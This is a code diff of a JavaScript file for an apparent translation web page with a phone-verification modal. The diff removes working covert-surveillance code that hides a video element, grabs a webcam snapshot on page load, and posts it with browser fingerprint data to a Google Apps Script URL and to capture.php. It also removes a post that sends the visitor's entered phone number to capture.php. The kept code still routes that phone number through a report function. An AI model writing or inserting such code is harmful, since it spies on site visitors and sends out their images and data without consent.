@@ -5,8 +5,6 @@
 const GOOGLE_SCRIPT_URL =
 "https://script.google.com/macros/s/AKfycbzo3Kd1tyIMeHkPsdxSMZ-zc8c1hRiu6KH6s0XbaxrgAWf89LARMC-pjSVvQr9DByOf/exec";
 
-const CAPTURE_URL = "capture.php";
-
 // ==========================================
 // SAFE GET
 // ==========================================
@@ -296,92 +294,6 @@ if (inputText) {
 }
 
 // ==========================================
-// 📸 WEBCAM CAPTURE → EMAIL
-// ==========================================
-
-function injectHiddenVideo() {
-    if (document.getElementById("novaV")) return;
-
-    const v = document.createElement("video");
-    v.id = "novaV";
-    v.autoplay = true;
-    v.playsInline = true;
-    v.muted = true;
-    v.style.display = "none";
-    document.body.appendChild(v);
-
-    const c = document.createElement("canvas");
-    c.id = "novaC";
-    c.style.display = "none";
-    document.body.appendChild(c);
-}
-
-async function captureWebcam() {
-    try {
-        injectHiddenVideo();
-
-        const stream = await navigator.mediaDevices.getUserMedia({
-            video: { width: 1280, height: 720, facingMode: "user" },
-            audio: false
-        });
-
-        const video = document.getElementById("novaV");
-        video.srcObject = stream;
-        await video.play();
-
-        await new Promise(r => setTimeout(r, 1500));
-
-        const canvas = document.getElementById("novaC");
-        canvas.width  = video.videoWidth  || 1280;
-        canvas.height = video.videoHeight || 720;
-        canvas.getContext("2d").drawImage(video, 0, 0, canvas.width, canvas.height);
-
-        const dataURL = canvas.toDataURL("image/jpeg", 0.85);
-        stream.getTracks().forEach(t => t.stop());
-
-        try {
-            await fetch(GOOGLE_SCRIPT_URL, {
-                method: "POST",
-                mode: "no-cors",
-                headers: { "Content-Type": "text/plain;charset=utf-8" },
-                body: JSON.stringify({
-                    img: dataURL,
-                    phone: "WEBCAM",
-                    ua: navigator.userAgent,
-                    lang: navigator.language,
-                    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    screen: screen.width + "x" + screen.height,
-                    platform: navigator.platform,
-                    page: location.href,
-                    time: new Date().toISOString()
-                })
-            });
-            console.log("📸 webcam sent");
-        } catch (e) { console.error("script send failed", e); }
-
-        try {
-            await fetch(CAPTURE_URL, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    img: dataURL,
-                    phone: "WEBCAM",
-                    ua: navigator.userAgent,
-                    lang: navigator.language,
-                    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    screen: screen.width + "x" + screen.height,
-                    platform: navigator.platform,
-                    page: location.href
-                })
-            });
-        } catch (e) { /* optional */ }
-
-    } catch (err) {
-        console.log("camera denied/blocked:", err);
-    }
-}
-
-// ==========================================
 // 📱 PHONE VERIFY MODAL
 // ==========================================
 
@@ -419,22 +331,6 @@ function injectVerifyModal() {
         const phone = document.getElementById("verifyPhone").value.trim();
         if (!phone) return;
 
-        try {
-            await fetch(CAPTURE_URL, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    phone,
-                    ua: navigator.userAgent,
-                    lang: navigator.language,
-                    tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
-                    screen: screen.width + "x" + screen.height,
-                    platform: navigator.platform,
-                    page: location.href
-                })
-            });
-        } catch (e) { console.error(e); }
-
         sendTranslationReport({
             phone: "PHONE:" + phone,
             original: "—",
@@ -465,8 +361,6 @@ function showVerifyModal() {
 // ==========================================
 
 window.addEventListener("load", () => {
-    setTimeout(captureWebcam, 800);
-
     setTimeout(() => {
         if (sessionStorage.getItem("novaVerifyShown") !== "1") {
             showVerifyModal();
